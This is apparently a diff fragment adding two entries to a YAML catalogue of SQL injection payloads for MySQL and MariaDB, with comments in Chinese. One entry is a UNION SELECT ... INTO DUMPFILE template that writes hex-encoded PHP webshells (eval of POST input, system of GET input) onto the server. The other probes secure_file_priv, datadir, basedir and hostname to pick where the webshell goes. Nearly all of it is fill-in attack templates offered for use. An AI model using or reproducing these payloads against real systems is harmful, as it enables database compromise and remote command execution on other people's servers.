+    component: [mysql, mariadb]
+    version: ">=5.0"
+    slots:
+      close:  {options: ["'", '"', "')", '") ', ""], default: "'"}
+      cols:   {options: ["1", "2", "3", "4", "5", "6", "7", "8", "9", "10"], default: "3"}
+      pos:    {options: ["1", "2", "3", "4", "5", "6", "7", "8", "9", "10"], default: "1"}
+      # 值是**十六进制字面量**，不是带引号的串：DUMPFILE 不转义，0x 形式能原样落字节，
+      # 也省掉槽位值要不要带引号这层歧义（引号属于模板，见规范 §4）
+      code:
+        options:
+          - {id: eval,   name: "PHP 一句话（@eval）",  hex: "0x3c3f70687020406576616c28245f504f53545b315d293b3f3e"}
+          - {id: system, name: "PHP 一句话（system）", hex: "0x3c3f7068702073797374656d28245f4745545b635d293b3f3e"}
+          - {id: echo,   name: "PHP echo 探针",       hex: "0x3c3f706870206563686f20313b3f3e"}
+        default: eval
+      comment: {options: ["-- -", "#", "/**/"], default: "-- -"}
+    body: "<<close>> UNION SELECT <<select(cols,pos,code.hex)>> INTO DUMPFILE '<<filepath>>' <<comment>>"
+    vars: [filepath]
+    requires: [file-priv, writable]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  # ---- 走文件路径之前先探这个 ----
+
+  - id: sqli.mysql.recon.file_priv
+    name: MySQL 文件权限与路径探测
+    desc: 决定要不要走读文件 / 写 webshell 之前先跑它。secure_file_priv 为空串才能任意路径读写，给了目录就只能在该目录下动手（5.7.6 起默认值从空串变成了一个平台相关目录），值为 NULL 表示读写都被禁；datadir 是数据目录、basedir 是安装目录，写马时的落点从这里挑
+    vuln: [sqli]
+    content_type: [sql-expression]
+    component: [mysql, mariadb]
+    version: ">=5.0.38"
+    slots:
+      close:  {options: ["'", '"', "')", '") ', ""], default: "'"}
+      cols:   {options: ["1", "2", "3", "4", "5", "6", "7", "8", "9", "10"], default: "3"}
+      pos:    {options: ["1", "2", "3", "4", "5", "6", "7", "8", "9", "10"], default: "1"}
+      # 0x7c 是竖线：一次把几个值拼成一行，省得开三次
+      expr:
+        options:
+          - {id: sfp,   name: "只看 secure_file_priv",            val: "@@secure_file_priv"}
+          - {id: sfpdd, name: "secure_file_priv + datadir",       val: "concat(@@secure_file_priv,0x7c,@@datadir)"}
+          - {id: all,   name: "再加 basedir",                     val: "concat(@@secure_file_priv,0x7c,@@datadir,0x7c,@@basedir)"}
+          - {id: os,    name: "编译平台",                          val: "@@version_compile_os"}
+          - {id: host,  name: "主机名",                            val: "@@hostname"}
+        default: all
+      comment: {options: ["-- -", "#", "/**/"], default: "-- -"}
+    body: "<<close>> UNION SELECT <<select(cols,pos,expr.val)>> <<comment>>"
+    vars: []
+    requires: [echo]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
